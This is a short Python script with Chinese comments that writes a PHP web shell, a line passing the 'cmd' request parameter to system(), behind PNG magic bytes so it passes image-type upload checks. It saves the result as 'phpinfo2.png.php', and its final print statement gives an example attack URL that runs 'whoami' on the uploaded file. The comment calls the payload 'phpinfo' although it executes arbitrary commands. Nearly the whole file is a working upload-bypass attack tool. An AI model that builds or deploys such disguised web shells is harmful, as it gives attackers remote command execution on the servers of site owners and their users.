from io import BytesIO

# PHP 内容（phpinfo）
php_content = '''
<?php 
system($_GET["cmd"]);
 ?>
'''

# PNG 文件的魔术数字（文件头标识）
png_magic_number = b'\x89PNG\r\n\x1a\n'

# 创建一个包含 PHP 代码且具有 PNG 魔术数字的 .png 文件的函数
def create_php_to_png_with_magic_number():
    # 创建一个内存中的字节缓冲区
    f = BytesIO()
    
    # 写入 PNG 文件的魔术数字
    f.write(png_magic_number)
    
    # 将 PHP 内容写入缓冲区
    f.write(php_content.encode('utf-8'))  # 将 PHP 内容转换为字节
    
    # 将缓冲区位置重置为起始位置
    f.seek(0)
    
    return f

# 创建内存中的 PHP .png 文件
php_png_file = create_php_to_png_with_magic_number()

# 可选：将文件保存为 .png 扩展名
with open('phpinfo2.png.php', 'wb') as output_file:
    output_file.write(php_png_file.read())

print("文件 'phpinfo.png' 成功创建，内容为 PHP 代码且带有 PNG 魔术数字！ , can use  the example.com /uploads/phpinfo.png.php to attack  --> http://example.com/uploads/phpinfo2.png.php?cmd=whoami")
